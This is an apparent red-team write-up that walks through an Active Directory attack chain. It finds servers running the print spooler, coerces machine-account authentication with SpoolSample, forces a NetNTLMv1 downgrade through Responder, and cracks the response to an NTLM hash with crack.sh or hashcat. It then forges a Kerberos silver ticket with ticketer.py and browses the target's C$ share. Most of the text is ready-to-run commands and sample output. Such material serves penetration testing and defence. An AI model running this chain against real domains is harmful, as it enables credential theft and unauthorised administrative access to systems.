# SpoolSample -> NetNTLMv1 -> NTLM -> Silver Ticket

This technique has been alluded to by others, but I haven't seen anything cohesive out there.  Below we'll walk through the steps of obtaining NetNTLMv1 Challenge/Response authentication, cracking those to NTLM Hashes, and using that NTLM Hash to sign a Kerberos Silver ticket.

This will work on networks where "LAN Manager authentication level" is set to 2 or less. This is a fairly common scenario in older, larger Windows deployments.  It should not work on Windows 10 / Server 2016 or newer.

## There are 3 main steps

Obtain a NetNTLMv1 Response of a machine account vis @tifkin_'s (Lee Christensen's) SpoolSample

Crack that NetNTLMv1 Response back into an NTLM Hash using @0x31337's (David Hulton's) Rainbow Tables

Generate a Silver Ticket using the newly obtained NTLM Hash using @agsolino's (Albert Solino's) ticketer.py

## Obtain a NetNTLMv1 Response

### Identify potentially vulnerable machines

Using Powershell, get a list of Windows boxes. Servers are usually priority, so lets focus there:

    Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders &gt; servers.txt

Using a slightly modified @mysmartlogin's (Vincent Le Toux's) SpoolerScanner, see if the Spooler Service is listening

    ForEach ($server in Get-Content servers.txt) {Get-SpoolSample $server}

You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol

    rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN

### Start Responder with the --lm flag to force a LM downgrade

    ./Responder.py -I eth0 --lm

### Trigger an authentication

    SpoolSample.exe TARGET RESPONDERIP

or use 3xocyte's dementor.py if you're on Linux

    python dementor.py -d domain -u username -p password RESPONDERIP TARGET

Example Response:

```bash
[SMB] NTLMv1 Client   : 10.0.0.2
[SMB] NTLMv1 Username : DOMAIN\SERVER$
[SMB] NTLMv1 Hash     : SERVER$::DOMAIN:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972:1122334455667788
```

## Crack the NetNTLMv1 responses back into an NTLM Hash

You can use a set of Rainbow Tables to reverse the NTHASH to NTLM, or you can reverse it to its DES constituent components and crack it with hashcat.  

An 8x 1080 rig can brute force it in about 6 days, so consider Rainbow Tables.

### Rainbow Tables

1. For Rainbow Tables, there is a service hosted at [https://crack.sh/netntlm/](https://crack.sh/netntlm/) that will recover NTLM from NetNTLMv1 for free. This is provided by David Hulton of Toorcon.  We're working on a local copy of the rainbow tables and software that does not require and FPGA for lookups.

2. For crack.sh, the format is
     NTHASH:(response), so NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972 from the example.

### Or Cracking Them with hashcat

1. @evil_mog's [ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) tool below can break them

```bash
python ntlmv1.py --nossp SERVER$::DOMAIN:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972:1122334455667788
```

This will return the below output with instructions:

```bash
Hashfield Split:
['SERVER$', '', 'DOMAIN', 'F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972', 'F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972', '1122334455667788']

Hostname: DOMAIN
Username: SERVER$
Challenge: 1122334455667788

LM Response: F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972
NT Response: F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972

CT1: F35A3FE17DCB31F9
CT2: BE8A8004B3F310C1
CT3: 50AFA36195554972

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin 50AFA36195554972 1122334455667788


To crack with hashcat create a file with the following contents:
F35A3FE17DCB31F9:1122334455667788
BE8A8004B3F310C1:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

## Create a Kerberos Silver Ticket

You'll need to find a few pieces of information for this: SPN of the service you want to access, domain SID, domain user account SID and account name with local admin access, and a domain group that user is a member of if it's group-based local admin.

For the service, the most common will be cifs/ as it maps back to the HOST/ service

### Generate a Silver Ticket using Impacket's ticketer.py

```bash
./ticketer.py -nthash 09e55a127f3d4e4957c77de30000502a -domain-sid S-1-5-21-7375663-6890924511-1272660413 -domain DOMAIN.COM -spn cifs/SERVER.DOMAIN.COM -user-id 123456 -groups 4321 username
```

### Set the generated ccache file to the appropriate environment variable

```bash
export KRB5CCNAME=/root/Assessments/NTLMTest/USERNAME.ccache
```

### Use smbclient, wmiexec,  psexec, or any other impacket tool

```bash
smbclient -k //SERVER.DOMAIN.COM/c$ -d
```

## Work left to do

* Distribute 6TB of Rainbow Tables
  * Torrent w/@0x31337's Permission?
  * DEF CON Data Duplication Village?

* Modify @0x31337's [desrtop](https://github.com/h1kari/desrtop) to not require an FPGA
  * Outside my personal wheelhouse, but I'm grinding anyway

* Identify more ways to trigger a machine account authentication remotely
  * xp_dirtree is another path
  * Anyone willing to share others they may have found?
